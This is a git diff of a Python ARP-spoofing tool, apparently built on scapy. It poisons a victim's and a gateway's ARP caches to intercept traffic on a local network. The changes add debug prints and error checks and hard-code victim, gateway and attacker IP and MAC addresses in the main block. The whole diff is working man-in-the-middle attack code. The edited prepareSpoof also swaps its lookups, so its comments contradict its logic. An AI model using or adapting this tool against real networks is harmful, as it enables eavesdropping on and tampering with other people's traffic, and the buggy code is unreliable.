@@ -3,7 +3,7 @@ import time
 
 
 class ARPSpoofer:
-    def __init__(self,victim_ip:str,router_ip:str,attacker_mac:str,victim_mac=None,router_mac=None,clockRate=1) -> None:
+    def __init__(self,victim_ip:str,router_ip:str,attacker_mac:str,victim_mac=None,router_mac=None,clockRate=None) -> None:
         '''
             For a successfull ARP spoofing we need the victim ip @ and it's default gtw
 
@@ -24,13 +24,23 @@ class ARPSpoofer:
         self.victim_mac = victim_mac
         self.router_mac = router_mac
         self.clockRate = clockRate
+        print('self.victim_ip',self.victim_ip)
+        print('self.victim_mac',self.victim_mac)
+        print('self.router_ip',self.router_ip)
+        print('self.router_mac',self.router_mac)
+        print('self.attacker_mac',self.attacker_mac)
+       
 
     def getContextMac(self,victime=True)->str:
         """Get the MAC address of the victim/router."""
         if victime :
             mac = self.getIpMac(self.victim_ip)
+            if not mac :
+                raise Exception("Could not get VICTIM MAC addresses. Ensure the device is reachable.")
             self.victim_mac = mac
         mac = self.getIpMac(self.router_ip)
+        if not mac :
+                raise Exception("Could not get GTW MAC addresses. Ensure the device is reachable.")
         self.router_mac = mac
           
     
@@ -39,7 +49,7 @@ class ARPSpoofer:
         arp_request = ARP(pdst=ip)
         broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
         arp_request_broadcast = broadcast / arp_request
-        answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+        answered_list = srp(arp_request_broadcast, verbose=True)[0]
         
         return answered_list[0][1].hwsrc if answered_list else None
     
@@ -60,10 +70,18 @@ class ARPSpoofer:
         send(arp_response_router, count=5, verbose=False)
 
     def prepareSpoof(self):
-        # Get the victim's MAC address
-        self.getContextMac(victime=True)
         # Get the router's MAC address
-        self.getContextMac(victime=False)
+        print("VICTIM MAC",self.victim_mac)
+        if not self.victim_mac :
+            self.getContextMac(victime=False)
+        else :
+            print("VICTIM MAC",self.victim_mac)
+            
+        # Get the victim's MAC address
+        if not self.router_mac :
+            self.getContextMac(victime=True)
+        else :
+            print("ROUTER MAC",self.router_mac)
 
         if self.victim_mac is None or self.router_mac is None:
             # exit(1)
@@ -87,6 +105,28 @@ class ARPSpoofer:
             self.clean()
 
 if __name__ == "__main__":
-    a = ARPSpoofer(victim_ip='192.168.1.68',router_ip="192.168.1.254",attacker_mac="ac:bc:32:91:0a:ad",clockRate=False)
-    a.spoof()
+    victim = {
+        'ip' : '192.168.1.74',
+        'mac' : "8:0:27:b4:97:59"
+    }
+    gtw = {
+        'ip' : '192.168.1.254',
+        'mac' : "80:ca:4b:ac:f3:3"
+    }
+    attacker = {
+        'ip' : '192.168.1.72',
+        'mac' : "ac:bc:32:91:0a:ad"
+    }
+    a = ARPSpoofer(
+        victim_ip='192.168.1.74',
+        router_ip="192.168.1.254",
+        attacker_mac="ac:bc:32:91:0a:ad",
+        clockRate=False,
+        router_mac=gtw.get("mac"),
+        victim_mac=victim.get('mac')
+    )
+    
+    a.spoof() 
+    # mac = a.getIpMac('192.168.1.254')
+    # print("gtw mac",mac)
         
